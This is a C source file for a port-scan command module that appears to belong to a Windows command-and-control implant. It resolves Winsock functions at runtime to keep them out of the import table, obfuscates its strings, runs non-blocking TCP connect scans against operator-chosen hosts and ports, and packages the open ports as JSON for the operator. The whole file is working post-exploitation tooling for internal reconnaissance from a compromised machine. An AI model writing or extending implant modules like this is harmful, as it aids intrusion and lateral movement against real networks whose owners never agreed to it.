#include "config.h"
#ifdef INCLUDE_CMD_PORTSCAN

#include "commands.h"
#include "json_out.h"

VOID cmd_portscan(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, ports_len = 0;
    char* host = parser_string(args, &host_len);
    char* ports = parser_string(args, &ports_len);
    if (!host || host_len == 0 || !ports || ports_len == 0) {
        package_add_string(inst, response, XSTR("Usage: portscan <host> <port,port-port,...>"));
        response->is_error = TRUE;
        return;
    }

    // resolve host
    xstr(_ws2, "ws2_32.dll");
    HMODULE h_ws2 = inst->Win32.LoadLibraryA(_ws2);
    typedef int (WINAPI *fn_WSAStartup_t)(WORD, void*);
    typedef int (WINAPI *fn_getaddrinfo_t)(const char*, const char*, void*, void**);
    typedef void (WINAPI *fn_freeaddrinfo_t)(void*);
    typedef int (WINAPI *fn_socket_t)(int, int, int);
    typedef int (WINAPI *fn_connect_t)(int, void*, int);
    typedef int (WINAPI *fn_closesocket_t)(int);
    typedef int (WINAPI *fn_select_t)(int, void*, void*, void*, void*);
    fn_WSAStartup_t pStartup = h_ws2 ? (fn_WSAStartup_t)(void*)inst->Win32.GetProcAddress(h_ws2, "WSAStartup") : NULL;
    fn_getaddrinfo_t pGet = h_ws2 ? (fn_getaddrinfo_t)(void*)inst->Win32.GetProcAddress(h_ws2, "getaddrinfo") : NULL;
    fn_freeaddrinfo_t pFree = h_ws2 ? (fn_freeaddrinfo_t)(void*)inst->Win32.GetProcAddress(h_ws2, "freeaddrinfo") : NULL;
    fn_socket_t pSock = h_ws2 ? (fn_socket_t)(void*)inst->Win32.GetProcAddress(h_ws2, "socket") : NULL;
    fn_connect_t pConnect = h_ws2 ? (fn_connect_t)(void*)inst->Win32.GetProcAddress(h_ws2, "connect") : NULL;
    fn_closesocket_t pCloseSock = h_ws2 ? (fn_closesocket_t)(void*)inst->Win32.GetProcAddress(h_ws2, "closesocket") : NULL;
    fn_select_t pSelect = h_ws2 ? (fn_select_t)(void*)inst->Win32.GetProcAddress(h_ws2, "select") : NULL;
    typedef int (WINAPI *fn_ioctl_t)(int, long, void*);
    fn_ioctl_t pIoctl = h_ws2 ? (fn_ioctl_t)(void*)inst->Win32.GetProcAddress(h_ws2, "ioctlsocket") : NULL;
    if (!pStartup || !pGet || !pSock || !pConnect || !pCloseSock || !pIoctl) {
        package_add_string(inst, response, XSTR("ws2_32 resolve failed"));
        response->is_error = TRUE;
        return;
    }
    WORD wsa_ver = 0x0202;
    BYTE wsa_data[400];
    pStartup(wsa_ver, wsa_data);

    // resolve host
    BYTE hints[64] = {0};
    *(DWORD*)(hints + 4) = 2; // AF_INET
    void* result = NULL;
    if (pGet(host, NULL, &hints, &result) != 0 || !result) {
        package_add_string(inst, response, XSTR("DNS resolution failed"));
        return;
    }
    void* ai = result;
    void* sa = *(void**)((BYTE*)ai + 32);
    DWORD target_ip = sa ? *(DWORD*)((BYTE*)sa + 4) : 0;
    pFree(result);
    if (!target_ip) {
        package_add_string(inst, response, XSTR("No address"));
        return;
    }

    // parse port list: comma-separated, ranges with dashes
    DWORD port_list[512];
    DWORD port_count = 0;
    DWORD i = 0;
    while (ports[i] && port_count < 512) {
        if (ports[i] >= '0' && ports[i] <= '9') {
            DWORD start = 0, end = 0;
            while (ports[i] >= '0' && ports[i] <= '9') { start = start*10 + (ports[i]-'0'); i++; }
            end = start;
            if (ports[i] == '-') { i++; while (ports[i] >= '0' && ports[i] <= '9') { end = end*10 + (ports[i]-'0'); i++; } }
            if (end == 0) end = start;
            if (end - start > 256) end = start + 256; // cap range
            for (DWORD p = start; p <= end && port_count < 512; p++) port_list[port_count++] = p;
        }
        while (ports[i] && ports[i] != ',') i++;
        if (ports[i] == ',') i++;
    }

    JSON_BUF jb;
    j_init(&jb);
    char ip_str[16];
    unsigned char* b = (unsigned char*)&target_ip;
    int sp = 0;
    for (int oct = 0; oct < 4; oct++) {
        DWORD v = b[oct];
        char tmp[4]; int ti = 0;
        if (v == 0) tmp[ti++] = '0';
        else while (v > 0) { tmp[ti++] = '0' + (char)(v % 10); v /= 10; }
        for (int jj = ti - 1; jj >= 0; jj--) ip_str[sp++] = tmp[jj];
        if (oct < 3) ip_str[sp++] = '.';
    }
    ip_str[sp] = 0;
    j_append_raw(&jb, "{\"host\":");
    j_append_str(&jb, host);
    j_append_raw(&jb, ",\"ip\":");
    j_append_str(&jb, ip_str);
    j_append_raw(&jb, ",\"open_ports\":[");

    DWORD open_count = 0;
    for (DWORD pi = 0; pi < port_count; pi++) {
        DWORD port = port_list[pi];
        int sock = pSock(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 0);
        if (sock < 0) continue;

        // set non-blocking
        unsigned long mode = 1;
        pIoctl(sock, 0x8004667E /*FIONBIO*/, &mode);

        // sockaddr_in: family(2) port(2 BE) ip(4) zero(8) = 16 bytes
        BYTE sa[16] = {0};
        *(WORD*)(sa + 0) = 2; // AF_INET
        *(WORD*)(sa + 2) = (WORD)((port >> 8) | ((port & 0xFF) << 8)); // big-endian
        *(DWORD*)(sa + 4) = target_ip;

        int cr = pConnect(sock, sa, 16);
        BOOL is_open = FALSE;
        if (cr == 0) {
            is_open = TRUE;
        } else {
            // select to check if connection completed
            BYTE fd_set_buf[256];
            es_memset(fd_set_buf, 0, sizeof(fd_set_buf));
            *(int*)fd_set_buf = 1; // fd_count
            *(int*)(fd_set_buf + 4) = sock; // fd_array[0]
            BYTE timeout[16];
            *(DWORD*)(timeout + 0) = 1; // sec
            *(DWORD*)(timeout + 8) = 0; // usec
            int sel = pSelect(0, NULL, &fd_set_buf, NULL, timeout);
            if (sel > 0) is_open = TRUE;
        }
        pCloseSock(sock);

        if (is_open) {
            if (open_count) j_append_raw(&jb, ",");
            j_append_raw(&jb, "{\"port\":");
            j_append_uint(&jb, port);
            j_append_raw(&jb, ",\"state\":\"open\"}");
            open_count++;
        }
    }

    j_append_raw(&jb, "],\"scanned\":");
    j_append_uint(&jb, port_count);
    j_append_raw(&jb, ",\"open\":");
    j_append_uint(&jb, open_count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
